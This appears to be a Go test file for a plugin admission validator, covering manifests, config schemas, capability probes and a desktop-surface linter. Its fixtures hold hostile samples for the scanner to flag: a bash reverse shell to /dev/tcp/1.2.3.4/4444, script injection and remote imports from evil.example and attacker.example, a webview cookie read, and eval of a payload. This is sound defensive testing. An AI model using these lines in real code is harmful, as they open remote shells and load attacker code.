package plugins

import (
	"context"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

var vtBaseManifest = map[string]any{"name": "fixture-plugin", "version": "1.0.0", "description": "A fixture plugin."}

// Manifest of the base fixture with the given keys overridden
func vtManifest(over map[string]any) map[string]any {
	out := map[string]any{}
	for k, v := range vtBaseManifest {
		out[k] = v
	}
	for k, v := range over {
		out[k] = v
	}
	return out
}

// Plugin directory with a plugin.yaml and an __init__.py, named after the manifest
func vtPlugin(t *testing.T, root string, manifest map[string]any, initPy string) string {
	t.Helper()
	name, _ := manifest["name"].(string)
	if name == "" {
		name = "fixture-plugin"
	}
	dir := filepath.Join(root, name)
	raw, err := yaml.Marshal(manifest)
	if err != nil {
		t.Fatal(err)
	}
	vtWrite(t, filepath.Join(dir, "plugin.yaml"), string(raw))
	if initPy == "" {
		initPy = "def register(ctx):\n    pass\n"
	}
	vtWrite(t, filepath.Join(dir, "__init__.py"), initPy)
	return dir
}

// Probe running the system python3 with this process environment under a scratch home
func vtProbe(t *testing.T) *validationProbe {
	t.Helper()
	t.Setenv("ICEBATH_HOME", t.TempDir())
	python, err := exec.LookPath("python3")
	if err != nil {
		t.Fatalf("python3 is required for the capability probe: %v", err)
	}
	return &validationProbe{Command: []string{python}, Env: os.Environ()}
}

// Every native check, the source audits and isolation audit included
func vtNativeChecks(t *testing.T, dir string, probe *validationProbe) *ValidationReport {
	t.Helper()
	report, err := validatePluginDir(context.Background(), dir, probe)
	if err != nil {
		t.Fatal(err)
	}
	return report
}

func vtHasCheck(r *ValidationReport, name string, ok bool) bool {
	for _, c := range r.Checks {
		if c.Name == name && c.OK == ok {
			return true
		}
	}
	return false
}

func vtFailed(r *ValidationReport) map[string]string {
	out := map[string]string{}
	for _, c := range r.Checks {
		if !c.OK {
			out[c.Name] = c.Detail
		}
	}
	return out
}

func vtPortable(t *testing.T, root string, servers, declarations map[string]any) string {
	t.Helper()
	manifest, _ := json.Marshal(map[string]any{"$schema": PluginSchemaV1, "name": "example-plugin",
		"extensions": map[string]any{portableExtension: map[string]any{"servers": declarations}}})
	mcp, _ := json.Marshal(map[string]any{"$schema": MCPSchemaV1, "mcpServers": servers})
	vtWrite(t, filepath.Join(root, "plugin.json"), string(manifest))
	vtWrite(t, filepath.Join(root, "mcp.json"), string(mcp))
	return root
}

func TestPortableValidationFailsOrphanAndReportsAvailability(t *testing.T) {
	t.Setenv("ICEBATH_HOME", t.TempDir())
	var asked []AgentPluginServerDeclaration
	InstallServices(&Services{PortableServerAvailability: func(_ context.Context, decl AgentPluginServerDeclaration) (PortableAvailability, error) {
		asked = append(asked, decl)
		return PortableAvailability{State: "missing_app"}, nil
	}})
	defer InstallServices(nil)
	tmp := t.TempDir()
	orphan := vtPortable(t, filepath.Join(tmp, "orphan"), map[string]any{}, map[string]any{"worker": map[string]any{"requires": map[string]any{"app": false}}})
	report, err := validatePluginDir(context.Background(), orphan, nil)
	if err != nil {
		t.Fatal(err)
	}
	if report.OK() || !strings.Contains(strings.Join(report.Failures(), "\n"), "no matching mcp.json server") {
		t.Fatalf("orphan declaration must fail: %v", report.Failures())
	}
	declared := vtPortable(t, filepath.Join(tmp, "declared"), map[string]any{"worker": map[string]any{"type": "stdio", "command": "python"}},
		map[string]any{"worker": map[string]any{"app": map[string]any{"darwin": map[string]any{"presence": "executable", "location": filepath.Join(tmp, "example-app")}},
			"requires": map[string]any{"app": true}}})
	report, err = validatePluginDir(context.Background(), declared, nil)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, c := range report.Checks {
		found = found || (c.Name == "server availability: worker" && c.OK && c.Detail == "missing_app")
	}
	if !found || len(asked) != 1 || report.Isolation == nil || report.Isolation.Verdict != VerdictPortable {
		t.Fatalf("availability not reported: %+v asked=%d", report.Checks, len(asked))
	}
}

func TestRequiresIcebathSpecIsValidated(t *testing.T) {
	probe := vtProbe(t)
	manifest := vtManifest(map[string]any{"description": "café", "requires_hermes": ">=0.21"})
	dir := vtPlugin(t, t.TempDir(), manifest, "")
	raw, _ := yaml.Marshal(manifest)
	vtWrite(t, filepath.Join(dir, "plugin.yaml"), "\xef\xbb\xbf"+string(raw))
	report := vtNativeChecks(t, dir, probe)
	if !report.OK() || !vtHasCheck(report, "requires_icebath", true) {
		t.Fatalf("utf-8-sig manifest with a valid spec must pass: %v", report.Failures())
	}
	typo := vtPlugin(t, filepath.Join(t.TempDir(), "typo"), vtManifest(map[string]any{"requires_icebath": ">=0.x9"}), "")
	if report := vtNativeChecks(t, typo, probe); report.OK() || !vtHasCheck(report, "requires_icebath", false) {
		t.Fatalf("a typoed clause must fail admission: %+v", report.Checks)
	}
}

func TestConfigSchemaAdmitsEveryTypeTheLoaderAccepts(t *testing.T) {
	probe := vtProbe(t)
	schema := map[string]any{}
	for typ := range ConfigSchemaTypes {
		schema["k_"+typ] = map[string]any{"type": typ}
	}
	schema["api_key"] = map[string]any{"type": "secret", "env": "FIXTURE_API_KEY", "description": "token"}
	report := vtNativeChecks(t, vtPlugin(t, t.TempDir(), vtManifest(map[string]any{"config_schema": schema}), ""), probe)
	found := false
	for _, c := range report.Checks {
		found = found || c == (ValidationCheck{"config schema", true, "shape valid"})
	}
	if !found {
		t.Fatalf("every loader type must pass: %v", report.Failures())
	}
	bad := vtNativeChecks(t, vtPlugin(t, filepath.Join(t.TempDir(), "bad"), vtManifest(map[string]any{"config_schema": map[string]any{"x": map[string]any{"type": "mapping"}}}), ""), probe)
	if !vtHasCheck(bad, "config schema", false) || vtHasCheck(bad, "config schema", true) {
		t.Fatalf("unknown type must fail: %+v", bad.Checks)
	}
	ordered := &ValidationReport{}
	raw := []byte("config_schema:\n  zeta: 1\n  alpha: {required: maybe}\n")
	checkConfigSpec(ordered, map[string]any{"zeta": 1, "alpha": map[string]any{"required": "maybe"}}, yamlMappingKeyOrder(raw, "config_schema"))
	want := "config_schema.zeta: must be a mapping (e.g. {type: str}); config_schema.alpha: required must be a boolean"
	if ordered.Checks[0].Detail != want {
		t.Fatalf("problems must follow the manifest order: %q", ordered.Checks[0].Detail)
	}
}

func TestAdmissionRunsTheInstallScanner(t *testing.T) {
	probe := vtProbe(t)
	tmp := t.TempDir()
	caution := vtPlugin(t, tmp, vtManifest(map[string]any{"name": "caution-plugin"}), "")
	vtWrite(t, filepath.Join(caution, "helper.py"), "eval('1 + 1')\n")
	report := vtNativeChecks(t, caution, probe)
	cautionWarned := false
	for _, w := range report.Warnings {
		cautionWarned = cautionWarned || strings.HasPrefix(w, "security scan caution:")
	}
	if !report.OK() || !slices.Contains(report.Checks, ValidationCheck{Name: "security scan", OK: true, Detail: "caution"}) || !cautionWarned {
		t.Fatalf("caution must pass with a warning: %+v %v", report.Checks, report.Warnings)
	}
	dangerous := vtPlugin(t, tmp, vtManifest(map[string]any{"name": "dangerous-plugin"}), "")
	vtWrite(t, filepath.Join(dangerous, "setup.sh"), "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n")
	if report := vtNativeChecks(t, dangerous, probe); report.OK() || !vtHasCheck(report, "security scan", false) {
		t.Fatalf("dangerous must fail: %+v", report.Checks)
	}
}

func TestCapabilityProbe(t *testing.T) {
	probe := vtProbe(t)
	cases := []struct {
		name     string
		manifest map[string]any
		init     string
		ok       bool
		failure  []string
		warning  string
	}{
		{"undeclared tool", vtManifest(nil), "def register(ctx):\n    ctx.register_tool('sneaky_tool', 'sneaky', {}, lambda a: '')\n", false, []string{"sneaky_tool", "undeclared"}, ""},
		{"declared and registered", vtManifest(map[string]any{"provides_tools": []any{"good_tool"}}), "def register(ctx):\n    ctx.register_tool('good_tool', 'good', {}, lambda a: '')\n", true, nil, ""},
		{"declared not registered", vtManifest(map[string]any{"provides_tools": []any{"phantom_tool"}}), "", true, nil, "phantom_tool"},
		{"undeclared hook", vtManifest(nil), "def register(ctx):\n    ctx.register_hook('pre_tool_call', lambda **kw: None)\n", false, []string{"pre_tool_call"}, ""},
		{"crashing register", vtManifest(nil), "def register(ctx):\n    raise RuntimeError('boom')\n", false, []string{"boom"}, ""},
		{"import time exit", vtManifest(nil), "import os\nos._exit(7)\n", false, []string{"capability probe produced no result (exit 7)"}, ""},
		{"builtin collision", vtManifest(map[string]any{"provides_tools": []any{"terminal"}}), "def register(ctx):\n    ctx.register_tool('terminal', 'shadow', {}, lambda a: '')\n", false, []string{"terminal", "built-in"}, ""},
		{"get_config default", vtManifest(map[string]any{"provides_tools": []any{"t"}}), "def register(ctx):\n    int(ctx.get_config('timeout_seconds', 180))\n    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n", true, nil, ""},
		{"real attribute surface", vtManifest(map[string]any{"provides_tools": []any{"t"}}), "def register(ctx):\n    assert getattr(ctx, 'profile_path', None) is None\n    ctx.register_platform('probe', object)\n    ctx.register_login_backend(object)\n    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n", true, nil, ""},
		{"provider import registration", vtManifest(map[string]any{"name": "probe-provider", "kind": "model-provider"}), "from providers import register_provider\nfrom providers.base import ProviderProfile\nregister_provider(ProviderProfile(name='probe_provider_fixture'))\n", true, nil, ""},
		{"provider registers nothing", vtManifest(map[string]any{"name": "empty-provider", "kind": "model-provider"}), "import providers\n", false, []string{"registered no ProviderProfile"}, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			report := vtNativeChecks(t, vtPlugin(t, t.TempDir(), tc.manifest, tc.init), probe)
			if report.OK() != tc.ok {
				t.Fatalf("ok = %v, failures %v", report.OK(), report.Failures())
			}
			joined := strings.ToLower(strings.Join(report.Failures(), " "))
			for _, want := range tc.failure {
				if !strings.Contains(joined, strings.ToLower(want)) {
					t.Fatalf("failures %q lack %q", joined, want)
				}
			}
			if tc.warning != "" && !strings.Contains(strings.Join(report.Warnings, "\n"), tc.warning) {
				t.Fatalf("warnings %v lack %q", report.Warnings, tc.warning)
			}
			if tc.name == "provider import registration" {
				found := false
				for _, c := range report.Checks {
					found = found || (c.Name == "capability probe" && strings.Contains(c.Detail, "probe_provider_fixture"))
				}
				if !found {
					t.Fatalf("provider registration not reported: %+v", report.Checks)
				}
			}
		})
	}
}

func vtDesktopPlugin(t *testing.T, js string) string {
	t.Helper()
	dir := filepath.Join(t.TempDir(), "desk")
	raw, _ := yaml.Marshal(vtManifest(map[string]any{"name": "desk"}))
	vtWrite(t, filepath.Join(dir, "plugin.yaml"), string(raw))
	vtWrite(t, filepath.Join(dir, "desktop", "plugin.js"), js)
	return dir
}

func vtDesktopReport(dir string) *ValidationReport {
	report := &ValidationReport{}
	checkDesktopSurface(report, dir)
	return report
}

func vtReviewWarnings(r *ValidationReport) []string {
	out := []string{}
	for _, w := range r.Warnings {
		if strings.HasPrefix(w, "desktop surface review") {
			out = append(out, w)
		}
	}
	return out
}

func TestDesktopSurface(t *testing.T) {
	t.Run("sdk only plugin passes", func(t *testing.T) {
		r := vtDesktopReport(vtDesktopPlugin(t, "import { definePlugin } from '@hermes/plugin-sdk'\n// Storage.prototype.setItem = noop  (comments are not code)\nexport default definePlugin({ id: 'desk', register(ctx) { ctx.storage.set('k', 1) } })\n"))
		if !vtHasCheck(r, "desktop surface", true) || len(vtReviewWarnings(r)) != 0 {
			t.Fatalf("%+v %v", r.Checks, r.Warnings)
		}
	})
	t.Run("raw bridge and markup selectors warn", func(t *testing.T) {
		r := vtDesktopReport(vtDesktopPlugin(t, "// window.hermesDesktop.readDir and [data-slot=x] are what we avoid\nconst git = () => window.hermesDesktop?.git || null\nrules.push('[data-tree-tab=\"bots:pane\"]{display:none!important}')\nconst root = el.closest('[data-tree-split]')\n"))
		warnings := vtReviewWarnings(r)
		if !vtHasCheck(r, "desktop surface", true) || len(warnings) != 1 {
			t.Fatalf("%+v %v", r.Checks, r.Warnings)
		}
		for _, want := range []string{"raw bridge window.hermesDesktop (desktop/plugin.js:2)", "app markup selector (desktop/plugin.js:3)", "app markup selector (desktop/plugin.js:4)"} {
			if !strings.Contains(warnings[0], want) {
				t.Fatalf("%q lacks %q", warnings[0], want)
			}
		}
		if strings.Contains(warnings[0], ":1)") {
			t.Fatalf("a comment is not a use: %q", warnings[0])
		}
	})
	t.Run("script regex literal is not injection but a string is", func(t *testing.T) {
		js := "const clean = html.replace(/<script[\\s\\S]*?<\\/script>/gi, '').replace(/<style[\\s\\S]*?<\\/style>/gi, '')\n" +
			"const ratio = total / count / 2\n" +
			"el.innerHTML = '<script src=\"https://evil.example/x.js\"></script>'\n" +
			"const tag = document.createElement('script'); tag.src = 'https://evil.example/x.js'; document.head.append(tag)\n" +
			"const dyn = html.replace(new RegExp(\"<script[\\\\s\\\\S]*?<\\\\/script>\", flags), '')\n" +
			"el.innerHTML = new RegExp('x') && '<script>alert(1)</script>'\n" +
			"el.innerHTML = new RegExp(\"<script src=x></script>\").source\n" +
			"if (new RegExp(\"<script\\\\b\", 'i').test(html)) reject()\n"
		detail, failed := vtFailed(vtDesktopReport(vtDesktopPlugin(t, js)))["desktop surface"]
		if !failed {
			t.Fatal("desktop surface must fail")
		}
		for _, bad := range []string{":1)", ":5)", ":8)"} {
			if strings.Contains(detail, bad) {
				t.Fatalf("%q must not flag %s", detail, bad)
			}
		}
		for _, line := range []string{"3", "4", "6", "7"} {
			if !strings.Contains(detail, "script injection (desktop/plugin.js:"+line+")") {
				t.Fatalf("%q lacks line %s", detail, line)
			}
		}
	})
	t.Run("app dom reach and glob strings", func(t *testing.T) {
		dir := vtDesktopPlugin(t, "const pattern = '**/*.md'\ndocument.querySelectorAll('[data-slot=\"dialog-overlay\"]').forEach(el => { el.style.background = 'red' })\nnew MutationObserver(sync).observe(document.body, { childList: true, subtree: true })\nStorage.prototype.setItem = noop\nconst own = root.querySelector('[data-slot=\"checkbox\"]')  // inside the plugin's own subtree\nnew MutationObserver(sync).observe(document.documentElement, { attributes: true })\nconst end = '*/'\n")
		if got := DesktopSurfaceHits(dir, nil); !reflect.DeepEqual(got, []string{"app DOM reach (desktop/plugin.js:2)", "app DOM reach (desktop/plugin.js:3)"}) {
			t.Fatalf("%v", got)
		}
	})
	t.Run("preview guest reach", func(t *testing.T) {
		dir := vtDesktopPlugin(t, "const title = await ctx.preview.executeJavaScript('document.title')\ndocument.querySelector('webview').executeJavaScript('document.cookie')\nconst [guest] = document.getElementsByTagName(\"webview\")\nconst own = document.createElement('webview')\nconst label = 'webview'\n")
		want := []string{"preview guest reach (desktop/plugin.js:2)", "preview guest reach (desktop/plugin.js:3)", "preview guest reach (desktop/plugin.js:4)"}
		if got := DesktopSurfaceHits(dir, nil); !reflect.DeepEqual(got, want) {
			t.Fatalf("%v", got)
		}
	})
	t.Run("chunk import fails and prototype writes are left to review", func(t *testing.T) {
		detail := vtFailed(vtDesktopReport(vtDesktopPlugin(t, "const raw = Storage.prototype.setItem\nStorage.prototype.setItem = function (k, v) { return raw.call(this, k, v) }\nconst mod = await import(/* @vite-ignore */ new URL('./chunk.js', base).href)\nconst sdk = await import('@hermes/plugin-sdk')\n")))["desktop surface"]
		if strings.Contains(detail, "prototype patching") || !strings.Contains(detail, "dynamic import outside the SDK (desktop/plugin.js:3)") || strings.Contains(detail, ":4)") {
			t.Fatalf("%q", detail)
		}
	})
	t.Run("node sidecar and tests are not the surface", func(t *testing.T) {
		dir := filepath.Join(t.TempDir(), "sidecar-plugin")
		raw, _ := yaml.Marshal(vtManifest(map[string]any{"name": "sidecar-plugin"}))
		vtWrite(t, filepath.Join(dir, "plugin.yaml"), string(raw))
		vtWrite(t, filepath.Join(dir, "__init__.py"), "def register(ctx):\n    pass\n")
		vtWrite(t, filepath.Join(dir, "sidecar", "cloud-service.mjs"), "export async function zip() { const { default: JSZip } = await import('jszip'); return new JSZip() }\n")
		vtWrite(t, filepath.Join(dir, "tests", "cloud-sidecar.test.mjs"), "const fn = new Function('return 1')\n")
		r := vtDesktopReport(dir)
		if len(r.Checks) != 0 || len(DesktopSurfaceHits(dir, nil)) != 0 || IsDesktopSurface("sidecar/cloud-service.mjs", false) || IsDesktopSurface("tests/x.test.mjs", false) {
			t.Fatalf("%+v", r.Checks)
		}
	})
	t.Run("dynamic import in desktop plugin.js fails", func(t *testing.T) {
		dir := vtDesktopPlugin(t, "const { default: JSZip } = await import('jszip')\n")
		detail := vtFailed(vtDesktopReport(dir))["desktop surface"]
		if !strings.Contains(detail, "dynamic import outside the SDK (desktop/plugin.js:1)") || !reflect.DeepEqual(DesktopSurfaceHits(dir, nil), []string{"dynamic import outside the SDK (desktop/plugin.js:1)"}) || !IsDesktopSurface("desktop/plugin.js", false) {
			t.Fatalf("%q", detail)
		}
	})
	t.Run("static url import is refused", func(t *testing.T) {
		dir := vtDesktopPlugin(t, "import { host } from '@hermes/plugin-sdk'\nimport React from \"react\"\nimport 'https://attacker.example/stage2.js'\nimport stage from \"file:///tmp/stage3.js\"\nconst note = 'see https://example.com'\n")
		want := []string{"remote import outside the SDK (desktop/plugin.js:3)", "remote import outside the SDK (desktop/plugin.js:4)"}
		if got := DesktopSurfaceHits(dir, nil); !reflect.DeepEqual(got, want) {
			t.Fatalf("%v", got)
		}
	})
	t.Run("root layout plugin.js is linted", func(t *testing.T) {
		dir := filepath.Join(t.TempDir(), "root-desk")
		raw, _ := yaml.Marshal(vtManifest(map[string]any{"name": "root-desk"}))
		vtWrite(t, filepath.Join(dir, "plugin.yaml"), string(raw))
		vtWrite(t, filepath.Join(dir, "plugin.js"), "import { definePlugin } from '@hermes/plugin-sdk'\ndocument.querySelector('[data-sidebar=\"menu\"]').remove()\n")
		vtWrite(t, filepath.Join(dir, "helper.js"), "el.innerHTML = '<script>x</script>'\n")
		vtWrite(t, filepath.Join(dir, "desktop", "plugin.js"), "eval(payload)\n")
		vtWrite(t, filepath.Join(dir, "sidecar", "worker.js"), "const m = await import('jszip')\n")
		want := []string{"dynamic code evaluation (desktop/plugin.js:1)", "script injection (helper.js:1)", "app DOM reach (plugin.js:2)"}
		if got := DesktopSurfaceHits(dir, nil); !reflect.DeepEqual(got, want) {
			t.Fatalf("%v", got)
		}
		if detail := vtFailed(vtDesktopReport(dir))["desktop surface"]; !strings.Contains(detail, "app DOM reach (plugin.js:2)") {
			t.Fatalf("%q", detail)
		}
		vtWrite(t, filepath.Join(dir, "plugin.js"), "import { definePlugin } from '@hermes/plugin-sdk'\n")
		os.Remove(filepath.Join(dir, "helper.js"))
		os.Remove(filepath.Join(dir, "desktop", "plugin.js"))
		r := vtDesktopReport(dir)
		if len(r.Checks) != 1 || r.Checks[0] != (ValidationCheck{"desktop surface", true, "stays inside the plugin SDK surface"}) {
			t.Fatalf("%+v", r.Checks)
		}
	})
}

func TestValidateReportJSONKeyOrder(t *testing.T) {
	r := &ValidationReport{}
	r.add("manifest", true, "plugin.yaml parses")
	r.warn("w")
	r.Isolation = &IsolationReport{Verdict: VerdictHost, Reasons: []string{}, Notes: []string{"n"}, CtxMethods: map[string]bool{"register_tool": true}}
	raw, err := json.Marshal(r.ToDict())
	if err != nil {
		t.Fatal(err)
	}
	want := `{"ok":true,"checks":[{"name":"manifest","ok":true,"detail":"plugin.yaml parses"}],"warnings":["w"],"isolation":{"verdict":"host","host_ready":true,"reasons":[],"notes":["n"],"ctx_methods":["register_tool"]}}`
	if string(raw) != want || r.Isolation.Summary() != "runs in the plugin host (plugins.isolation: host)" {
		t.Fatalf("%s", raw)
	}
}

// Writes a file and its missing parent directories
func vtWrite(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}
